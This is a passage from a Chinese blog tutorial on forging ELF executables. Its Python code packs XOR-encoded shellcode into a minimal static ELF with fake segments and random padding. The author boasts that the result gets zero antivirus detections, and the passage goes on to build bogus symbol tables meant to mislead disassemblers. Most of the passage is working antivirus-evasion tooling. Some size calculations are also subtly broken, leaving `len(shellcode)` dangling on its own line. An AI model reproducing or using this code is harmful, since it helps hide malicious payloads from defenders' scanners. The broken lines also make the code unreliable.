尝试执行就会报错，告诉你 ./a.out 文件存在</span></span><br><span class="line"></span><br><span class="line">$ /lib/ld-linux.so.2  ./a.out </span><br><span class="line">dds</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 /lib/ld-linux.so.2 进行加载就可以正常执行</span></span><br></pre></td></tr></table></figure></li><li><p>PT_LOAD: 不必再解释了。</p></li><li><p>PT_DYNAMIC:  此类型段给出动态链接信息，指向的是 .dynamic 节。动态链接的ELF文件会有这个段。</p></li><li><p>PT_NOTE: 不必再解释了。</p></li><li><p>PT_GNU_EH_FRAME: 指向 .eh_frame_hdr 节，与异常处理相关，我们暂时先不关注</p></li><li><p>PT_GNU_STACK: 用来标记栈是否可执行的，编译选项 <code>-z execstack/noexecstack</code> 的具体实现。</p></li><li><p>PT_GNU_RELRO:  relro(read only relocation)安全机制，linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，从定位之后的函数指针被修改。</p></li></ol><p>接下来我们为ELF文件伪造如下段: <code>PT_PHDR</code>,<code>PT_INERP</code>,<code>两个PT_LOAD</code>,<code>PT_NOTE</code>，理论上就可以就可以构造一个看起来正常并且可执行的ELF文件了。</p><p>但是linux中动态链接的ELF文件和静态链接的ELF文件的加载执行过程还是存在着比较大的差异，这其中涉及到很多我们没有讲到的知识，所以想直接构建出动态链接的ELF文件是有困难的，关于这部分知识我会在以后的ELF壳专题文章中进行详细的拆解。</p><h3 id="静态链接的ELF文件"><a href="#静态链接的ELF文件" class="headerlink" title="静态链接的ELF文件"></a>静态链接的ELF文件</h3><p>编译一个静态链接的ELF文件，<code>gcc -m32 test.c  -o test -static</code>,编译后文件大小是642kb(关于静态链接的背后是怎么实现的，以后再写其他文章进行详解),查看 <code>Segment</code> 信息如下：</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210629125019.png" alt=""></p><p>注意 <code>PT_GNU_RELRO</code> 段指向的数据和第二个 <code>PT_LOAD</code> 段指向的是同一块数据。<br>接下来我们构造如下的段信息 <code>两个PT_LOAD</code>,<code>PT_NOTE</code>,<code>PT_TLS</code>,<code>PT_GNU_RELRO</code>段，我们接着上一节的代码写:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    decodeSub,shellcode,length,key =  generate_shikata_block(generate_shellcode())</span><br><span class="line">    print(decodeSub+shellcode,length,key)</span><br><span class="line"></span><br><span class="line">    shellcode = xor_encrypt(decodeSub,shellcode,length,key)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span>.join( </span><br><span class="line">            [ </span><br><span class="line">                chr( i ) <span class="keyword">for</span> i <span class="keyword">in</span> shellcode </span><br><span class="line">            ] </span><br><span class="line">        ).encode(<span class="string">"latin-1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shellcode = pad(shellcode,b=b"\xcc")</span></span><br><span class="line">    elf_header = build_elf_header()</span><br><span class="line">    pheaders = []</span><br><span class="line"></span><br><span class="line">    PHEADERS_LEN = <span class="number">5</span></span><br><span class="line">    elf_header.e_phnum = PHEADERS_LEN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># PT_NOTE_LEN = random.randint(0x50,0x100) //4 * 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 PT_NOTE 段</span></span><br><span class="line">    PT_NOTE_LEN = <span class="number">0x44</span></span><br><span class="line">    elf_pheader_pt_note = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">0x4</span>,</span><br><span class="line">        p_flags = <span class="number">0x4</span>, </span><br><span class="line">        p_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR,</span><br><span class="line">        </span><br><span class="line">        p_paddr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR ,</span><br><span class="line"></span><br><span class="line">        p_filesz = PT_NOTE_LEN, <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = PT_NOTE_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x4</span>   </span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 伪造第一个 PT_LOAD 段</span></span><br><span class="line">    elf_pheader_pt_load_1 = build_elf_pheader()</span><br><span class="line">    elf_pheader_pt_load_1.p_filesz = c.sizeof( elf_header ) </span><br><span class="line">    + c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN</span><br><span class="line">    len(shellcode) </span><br><span class="line"></span><br><span class="line">    elf_pheader_pt_load_1.p_memsz  =  c.sizeof( elf_header ) </span><br><span class="line">    + c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN</span><br><span class="line">    len(shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 PT_TLS </span></span><br><span class="line">    PT_TLS_LEN = random.randint(<span class="number">0x50</span>,<span class="number">0x100</span>) //<span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    elf_pheader_pt_tls = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">0x7</span>,</span><br><span class="line">        p_flags = <span class="number">0x4</span>, </span><br><span class="line">        p_offset =  c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_filesz = PT_TLS_LEN , <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = PT_TLS_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x4</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造第二个 PT_LOAD 段</span></span><br><span class="line">    LOADABLE_LEN = random.randint(<span class="number">0x100</span>,<span class="number">0x200</span>)//<span class="number">4</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    elf_pheader_pt_load_2 = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">0x1</span>,</span><br><span class="line">        p_flags = <span class="number">0x6</span>, </span><br><span class="line">        p_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span> ,</span><br><span class="line"></span><br><span class="line">        p_filesz = LOADABLE_LEN + PT_TLS_LEN , <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = LOADABLE_LEN + PT_TLS_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x1000</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 PT_GNU_RELRO 段</span></span><br><span class="line">    elf_pheader_pt_gun_relro = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">1685382482</span>,</span><br><span class="line">        p_flags = <span class="number">0x6</span>, </span><br><span class="line">        p_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span> ,</span><br><span class="line"></span><br><span class="line">        p_filesz = LOADABLE_LEN + PT_TLS_LEN , <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = LOADABLE_LEN + PT_TLS_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x1</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    pheaders = [</span><br><span class="line">        elf_pheader_pt_load_1,elf_pheader_pt_load_2,</span><br><span class="line">        elf_pheader_pt_note,elf_pheader_pt_tls,elf_pheader_pt_gun_relro</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    elf_header.e_entry = elf_pheader_pt_load_1.p_vaddr + \</span><br><span class="line">        c.sizeof( ElfN_Ehdr ) + \</span><br><span class="line">        c.sizeof( ElfN_Phdr ) * PHEADERS_LEN  + PT_NOTE_LEN</span><br><span class="line">    <span class="comment"># elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span></span><br><span class="line">    <span class="comment"># elf_pheader_bytes = c.string_at(c.addressof(elf_pheader_pt_load_1),c.sizeof(elf_pheader_pt_load_1))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span><br><span class="line">        fd.write( elf_header_bytes)</span><br><span class="line">        <span class="keyword">for</span> ph <span class="keyword">in</span> pheaders:</span><br><span class="line">            fd.write( c.string_at( c.addressof(ph),c.sizeof(ph) ) )</span><br><span class="line">        </span><br><span class="line">        fd.write( bytes([ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_NOTE_LEN)]  ) )</span><br><span class="line">        fd.write(shellcode)</span><br><span class="line">        </span><br><span class="line">        fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_TLS_LEN)] )  )</span><br><span class="line">        fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(LOADABLE_LEN)] ) )</span><br></pre></td></tr></table></figure><p>这样伪造的ELF文件大小为1kb，就是彻底的0查杀了。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210629134339.png" alt=""></p><h2 id="丰富ELF文件的节信息"><a href="#丰富ELF文件的节信息" class="headerlink" title="丰富ELF文件的节信息"></a>丰富ELF文件的节信息</h2><p><code>Section</code>信息对于静态链接的ELF文件来讲是完全不必要的存在，但是如果一个可执行文件没有节信息，那必然看起来很奇怪，势必会引起杀软的关注，那么下面就开始继续伪造ELF文件的节信息。</p><p>我们知道，当一个静态链接的二进制没有符号的时候，分析起来是比较困难的，但是如果一个静态链接的二进制全是错误的符号信息，那是不是也能混淆视听呢？ 那好，我们接下来的目标就是构造一堆乱七八糟的符号来误导反汇编的结果。</p><p>ELF文件的符号信息主要存储在section <code>.symtab</code> 中，首先先来大概的说明一下 <code>.symtab</code>符号表的结构，以下以x86为例说明：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Elf32_Word st_name;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  是符号名的字符串表示在字符串表中的索引，一般是`.strtab`节中的索引值，如果该值非 0，则它表示了给出符号名的字符串表索引，否则符号表项没有名称。</span></span><br><span class="line"><span class="comment">  注:外部 C 符号在 C 语言和目标文件的符号表中具有相同的名称。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Elf32_Addr st_value; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  此成员给出相关联的符号的取值。依赖于具体的上下文，它可能是一个 绝对值、一个地址等等。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Elf32_Word st_size; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  很多符号具有相关的尺寸大小。例如一个数据对象的大小是对象中包含 的字节数。如果符号没有大小或者大小未知，则此成员为 0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">目前为 0，其含义没有被定义。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Elf32_Half st_shndx;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">符号所在的节区索引值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;Elf32_sym;</span><br></pre></td></tr></table></figure><p>st_info 中包含符号类型和绑定信息，操纵方式如:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(i) ((i)&gt;&gt;4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(i) ((i)&amp;0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure><p>从中可以看出，st_info 的高四位表示符号绑定，用于确定链接可见性和行为。具体的绑定类型如:</p><p>ELF32_ST_BIND 的取值说明如下：</p><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL</td><td>0</td><td>局部符号在包含该符号定义的目标文件以外不可见。相同名称的局部符号可以存在于多个文件中，互不影响。</td></tr><tr><td>STB_GLOBAL</td><td>1</td><td>全局符号对所有将组合的目标文件都是可见的。一个文件中对某个全局符号的定义将满足另一个文件对相同全局符号的 未定义引用。</td></tr><tr><td>STB_WEAK</td><td>2</td><td>弱符号与全局符号类似，不过他们的定义优先级比较低。</td></tr><tr><td>STB_LOPROC</td><td>13</td><td>处于这个范围的取值是保留给处理器专用语义的。</td></tr><tr><td>STB_HIPROC</td><td>15</td><td>处于这个范围的取值是保留给处理器专用语义的。</td></tr></tbody></table><p>ELF32_ST_TYPE 符号类型的定义如下：</p><table><thead><tr><th align="center">名称</th><th align="center">取值</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">STT_NOTYPE</td><td align="center">0</td><td align="center">符号的类型没有指定</td></tr><tr><td align="center">STT_OBJECT</td><td align="center">1</td><td align="center">符号与某个数据对象相关，比如一个变量、数组等等</td></tr><tr><td align="center">STT_FUNC</td><td align="center">2</td><td align="center">符号与某个函数或者其他可执行代码相关</td></tr><tr><td align="center">STT_SECTION</td><td align="center">3</td><td align="center">符号与某个节区相关。这种类型的符号表项主要用于重定 位，通常具有 STB_LOCAL 绑定。</td></tr><tr><td align="center">STT_FILE</td><td align="center">4</td><td align="center">传统上，符号的名称给出了与目标文件相关的源文件的名 称。文件符号具有 STB_LOCAL 绑定，其节区索引是SHN_ABS，并且它优先于文件的其他 STB_LOCAL 符号 (如果有的话)</td></tr><tr><td align="center">STT_LOPROC</td><td align="center">13</td><td align="center">此范围的符号类型值保留给处理器专用语义用途。</td></tr><tr><td align="center">STT_HIPROC</td><td align="center">15</td><td align="center">此范围的符号类型值保留给处理器专用语义用途。</td></tr></tbody></table><p>接下来我们为ELF文件构造如下的节: <code>.text</code>,<code>.data.rel.ro</code>,<code>.symtab</code>,<code>.rodata</code>,<code>.strtab</code>,<code>.shstrtab</code>。其中 <code>.shstrtab</code> 是最后一个节，可以用来定位其他节的名称信息，比较特殊，关于ELF文件节信息的含义不再赘述。</p><h3 id="准备一些结构"><a href="#准备一些结构" class="headerlink" title="准备一些结构"></a>准备一些结构</h3><p>首先要定义节表的结构体信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElfN_Shdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line"></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line"></span><br><span class="line">        (<span class="string">"sh_name"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_type"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_flags"</span>,ElfN_Xword),</span><br><span class="line">        (<span class="string">"sh_addr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"sh_offset"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"sh_size"</span>,ElfN_Xword),</span><br><span class="line">        (<span class="string">"sh_link"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_info"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_addralign"</span>,ElfN_Xword),</span><br><span class="line">        (<span class="string">"sh_entsize"</span>,ElfN_Xword)</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>为了存储符号信息，也需要定义符号表的结构体：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_Sym</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">        // Symbol table entries for ELF32.</span></span><br><span class="line"><span class="string">        struct Elf32_Sym &#123;</span></span><br><span class="line"><span class="string">            Elf32_Word st_name;     // Symbol name (index into string table)</span></span><br><span class="line"><span class="string">            Elf32_Addr st_value;    // Value or address associated with the symbol</span></span><br><span class="line"><span class="string">            Elf32_Word st_size;     // Size of the symbol</span></span><br><span class="line"><span class="string">            unsigned char st_info;  // Symbol's type and binding attributes</span></span><br><span class="line"><span class="string">            unsigned char st_other; // Must be zero; reserved</span></span><br><span class="line"><span class="string">            Elf32_Half st_shndx;    // Which section (header table index) it's defined in</span></span><br><span class="line"><span class="string">        &#125;; </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"st_name"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_value"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_size"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_info"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_other"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_shndx"</span>,c.c_ushort)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf64_Sym</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">     // Symbol table entries for ELF64.</span></span><br><span class="line"><span class="string">        struct Elf64_Sym &#123;</span></span><br><span class="line"><span class="string">            Elf64_Word st_name;     // Symbol name (index into string table)</span></span><br><span class="line"><span class="string">            unsigned char st_info;  // Symbol's type and binding attributes</span></span><br><span class="line"><span class="string">            unsigned char st_other; // Must be zero; reserved</span></span><br><span class="line"><span class="string">            Elf64_Half st_shndx;    // Which section (header tbl index) it's defined in</span></span><br><span class="line"><span class="string">            Elf64_Addr st_value;    // Value or address associated with the symbol</span></span><br><span class="line"><span class="string">            Elf64_Xword st_size;    // Size of the symbol </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"st_name"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_info"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_other"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_shndx"</span>,c.c_ushort),</span><br><span class="line">        (<span class="string">"st_value"</span>,c.c_ulonglong),</span><br><span class="line">        (<span class="string">"st_size"</span>,c.c_ulonglong)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ARCH == <span class="string">"x86"</span>:</span><br><span class="line">    ElfN_Sym = Elf32_Sym</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ElfN_Sym = Elf64_Sym</span><br></pre></td></tr></table></figure><p>ELF文件中的字符串也是一个表结构存储的，字符串表是用来存储ELF中会用的各种字符串的值，引用的时候只需要提供字符串索引就够了，为了方便字符串的管理和使用，我们这里定义一个类 <code>Elf_Str_Table</code> 来管理字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf_Str_Table</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__table = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,string=None,strings=[])</span>:</span></span><br><span class="line">        <span class="comment"># 不能重复</span></span><br><span class="line">        <span class="keyword">if</span> string:</span><br><span class="line">            string = string.encode(<span class="string">"latin-1"</span>)</span><br><span class="line">            <span class="keyword">if</span> string <span class="keyword">not</span> <span class="keyword">in</span> self.__table:</span><br><span class="line">                self.__table.append(string)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> strings:</span><br><span class="line">            <span class="keyword">for</span> string <span class="keyword">in</span> strings:</span><br><span class="line">                string = string.encode(<span class="string">"latin-1"</span>)</span><br><span class="line">                <span class="keyword">if</span> string <span class="keyword">not</span> <span class="keyword">in</span> self.__table:</span><br><span class="line">                    self.__table.append(string)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print( self.__table )</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(self,string)</span>:</span></span><br><span class="line">        <span class="comment"># 找到 str 在表中的索引</span></span><br><span class="line">        string = string.encode(<span class="string">"latin-1"</span>)</span><br><span class="line">        <span class="keyword">if</span> string <span class="keyword">in</span> self.__table:</span><br><span class="line">            index = self.__table.index(string)</span><br><span class="line">            <span class="comment"># print(index)</span></span><br><span class="line">            <span class="keyword">return</span> len(self.dump( index=index ))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span 